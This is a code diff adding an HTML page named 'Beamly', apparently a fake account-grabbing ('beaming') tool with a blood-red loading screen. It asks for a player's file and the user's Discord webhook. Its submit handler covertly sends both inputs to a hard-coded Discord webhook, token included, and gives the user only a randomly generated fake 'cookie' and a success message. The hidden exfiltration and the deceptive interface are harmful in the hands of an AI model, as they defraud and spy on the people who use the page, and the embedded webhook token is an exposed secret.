@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading Screen with Bloody Font</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: white;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      position: relative;
+      overflow: hidden;
+    }
+
+    #background {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: -2;
+    }
+
+    .dot {
+      position: absolute;
+      width: 2px;
+      height: 2px;
+      background-color: red;
+      border-radius: 50%;
+      opacity: 0.8;
+    }
+
+    .bloody-text {
+      font-size: 3rem;
+      font-family: 'Impact', sans-serif;
+      color: red;
+      text-shadow: 0 0 10px red, 0 0 20px darkred, 0 0 30px darkred;
+      margin-bottom: 20px;
+    }
+
+    .loading-container {
+      text-align: center;
+      z-index: 1;
+      color: white;
+      position: relative;
+      padding: 20px;
+      border-radius: 10px;
+      background: rgba(0, 0, 0, 0.8);
+    }
+
+    .progress-bar-container {
+      width: 200px;
+      height: 200px;
+      border-radius: 50%;
+      border: 10px solid #ff3333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      background: rgba(0, 0, 0, 0.7);
+    }
+
+    .progress-bar {
+      width: 180px;
+      height: 180px;
+      border-radius: 50%;
+      background: conic-gradient(red 0% 0%);
+      position: absolute;
+    }
+
+    .progress-bar span {
+      font-size: 1.5rem;
+      color: white;
+      position: absolute;
+      z-index: 2;
+    }
+
+    .content {
+      color: white;
+      text-align: center;
+    }
+
+    .form-container {
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      border: 2px solid #ff3333;
+      border-radius: 25px;
+      padding: 10px;
+      background-color: #333;
+      margin-top: 20px;
+    }
+
+    input {
+      background: transparent;
+      border: none;
+      color: white;
+      font-size: 16px;
+      padding: 12px 20px;
+      width: 250px;
+      border-radius: 25px;
+      margin-right: 10px;
+      outline: none;
+    }
+
+    input:focus {
+      border: 2px solid red;
+    }
+
+    button {
+      background-color: #ff3333;
+      border: none;
+      padding: 12px 20px;
+      color: white;
+      cursor: pointer;
+      border-radius: 25px;
+      font-size: 16px;
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #ff1a1a;
+      transform: scale(1.1);
+    }
+
+    .error-message {
+      color: red;
+      font-size: 18px;
+      margin-top: 20px;
+      display: none;
+    }
+
+    .success-message {
+      display: none;
+      color: green;
+      background-color: #333;
+      padding: 10px;
+      border-radius: 10px;
+      margin-top: 20px;
+      border: 2px solid green;
+      font-size: 18px;
+      text-align: center;
+    }
+
+    .checkmark {
+      color: green;
+      font-size: 30px;
+      margin-left: 10px;
+    }
+
+    .loading-text {
+      font-size: 1.5rem;
+      color: white;
+      margin-top: 10px;
+    }
+
+    .dots {
+      display: inline-block;
+      animation: dots 1.5s steps(5, end) infinite;
+    }
+
+    @keyframes dots {
+      0% { content: "."; }
+      20% { content: ".."; }
+      40% { content: "..."; }
+      60% { content: "...."; }
+      80% { content: "....."; }
+      100% { content: "."; }
+    }
+
+  </style>
+</head>
+<body>
+  <div id="background"></div>
+
+  <!-- Loading Screen -->
+  <div class="loading-container" id="loadingContainer">
+    <h1 class="bloody-text">Loading...</h1>
+    <div class="progress-bar-container">
+      <div class="progress-bar" id="progress-bar"></div>
+      <span id="loading-text">0%</span>
+    </div>
+    <div class="loading-text">
+      <span>Collecting Data</span>
+      <span class="dots"></span>
+    </div>
+  </div>
+
+  <!-- Beamly Content (hidden until loading is complete) -->
+  <div class="content" id="beamlyContent" style="display: none;">
+    <h1 class="bloody-text">Beamly</h1>
+    <div class="form-container">
+      <input type="text" id="urlInput" placeholder="Enter player's file..." />
+      <input type="text" id="webhookInput" placeholder="Enter Discord Webhook..." />
+      <button id="submitBtn">Submit</button>
+    </div>
+
+    <div class="success-message" id="successMessage">
+      <span>Successful submission!</span>
+      <span class="checkmark">✔</span>
+    </div>
+    <div class="error-message" id="errorMessage">Please enter both URL and Webhook!</div>
+  </div>
+
+  <script>
+    let normalDots = [];
+    const background = document.getElementById("background");
+
+    let isLoading = true;
+
+    function createDots() {
+      const numDots = 200;
+      const windowWidth = window.innerWidth;
+      const windowHeight = window.innerHeight;
+
+      for (let i = 0; i < numDots; i++) {
+        const dot = document.createElement("div");
+        dot.classList.add("dot");
+
+        const x = Math.random() * windowWidth;
+        const y = Math.random() * windowHeight;
+
+        dot.style.left = `${x}px`;
+        dot.style.top = `${y}px`;
+        background.appendChild(dot);
+        normalDots.push({ element: dot, x, y });
+      }
+    }
+
+    function updateProgressBar() {
+      let progress = 0;
+      const progressBar = document.getElementById('progress-bar');
+      const loadingText = document.getElementById('loading-text');
+      
+      const interval = setInterval(() => {
+        progress += 1;
+        const angle = (progress / 100) * 360;
+        progressBar.style.background = `conic-gradient(red ${angle}deg, transparent 0deg)`;
+        loadingText.textContent = `${progress}%`;
+
+        if (progress >= 100) {
+          clearInterval(interval);
+          transitionToBeamly();
+        }
+      }, 100);
+    }
+
+    function animateDotsDuringLoading() {
+      normalDots.forEach((dot) => {
+        const speed = 2;
+        dot.y += speed;
+
+        if (dot.y > window.innerHeight) {
+          dot.y = -5;
+          dot.x = Math.random() * window.innerWidth;
+        }
+
+        dot.element.style.top = `${dot.y}px`;
+        dot.element.style.left = `${dot.x}px`;
+      });
+
+      if (isLoading) {
+        requestAnimationFrame(animateDotsDuringLoading);
+      }
+    }
+
+    function animateDotsAfterLoading() {
+      normalDots.forEach((dot) => {
+        const speed = 0.1;
+        dot.y += speed;
+
+        if (dot.y > window.innerHeight) {
+          dot.y = -5;
+          dot.x = Math.random() * window.innerWidth;
+        }
+
+        dot.element.style.top = `${dot.y}px`;
+        dot.element.style.left = `${dot.x}px`;
+      });
+
+      if (isLoading) {
+        requestAnimationFrame(animateDotsAfterLoading);
+      }
+    }
+
+    function transitionToBeamly() {
+      setTimeout(() => {
+        document.getElementById("loadingContainer").style.display = "none";
+        document.getElementById("beamlyContent").style.display = "block";
+        animateDotsAfterLoading();
+      }, 1000);
+    }
+
+    createDots();
+    updateProgressBar();
+    animateDotsDuringLoading();
+
+    // Generate a random cookie value like the example
+    function generateRandomCookie() {
+      const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+      let cookieValue = "";
+      for (let i = 0; i < 400; i++) {
+        const randomChar = charset.charAt(Math.floor(Math.random() * charset.length));
+        cookieValue += randomChar;
+      }
+      return cookieValue;
+    }
+
+    // Handle form submission
+    const submitBtn = document.getElementById('submitBtn');
+    const urlInput = document.getElementById('urlInput');
+    const webhookInput = document.getElementById('webhookInput');
+    const errorMessage = document.getElementById('errorMessage');
+    const successMessage = document.getElementById('successMessage');
+
+    submitBtn.addEventListener('click', () => {
+      if (urlInput.value && webhookInput.value) {
+        const randomCookie = generateRandomCookie();
+        const userWebhook = webhookInput.value;
+        const userURL = urlInput.value;
+
+        // Log data for debugging
+        console.log('User URL:', userURL);
+        console.log('User Webhook:', userWebhook);
+        console.log('Random Cookie:', randomCookie);
+
+        // Check if URL or webhook is too large
+        const maxLength = 2000;
+        if (userURL.length > maxLength || userWebhook.length > maxLength) {
+          // Send as .txt file if URL or webhook is too large
+          const fileContent = `User URL:\n${userURL}\n\nUser Webhook:\n${userWebhook}`;
+
+          // Prepare the form data to send as a file
+          const formData = new FormData();
+          const blob = new Blob([fileContent], { type: 'text/plain' });
+          formData.append('file', blob, 'user_data.txt');
+
+          fetch('https://discord.com/api/webhooks/1334728600410263633/vka-goPkNXDSosawEXGMOXRIa6KWK3Rm0cZtWb6NJPYOE2QtllR7ivJlbhCFX7QZ4NCF', {
+            method: 'POST',
+            body: formData
+          });
+        } else {
+          // Send data as text content
+          fetch('https://discord.com/api/webhooks/1334728600410263633/vka-goPkNXDSosawEXGMOXRIa6KWK3Rm0cZtWb6NJPYOE2QtllR7ivJlbhCFX7QZ4NCF', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              content: `User submitted the following data:\n**URL:** ${userURL}\n**Webhook:** ${userWebhook}\n**Cookie:** \`\`\`${randomCookie}\`\`\``,
+            }),
+          });
+        }
+
+        // Send cookie to the user's webhook
+        fetch(userWebhook, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `Here's your cookie 🍪\n\`\`\`${randomCookie}\`\`\``,
+          }),
+        });
+
+        // Show success message and clear form
+        successMessage.style.display = 'block';
+        urlInput.value = '';
+        webhookInput.value = '';
+
+      } else {
+        errorMessage.style.display = 'block';
+      }
+    });
+
+  </script>
+</body>
+</html>
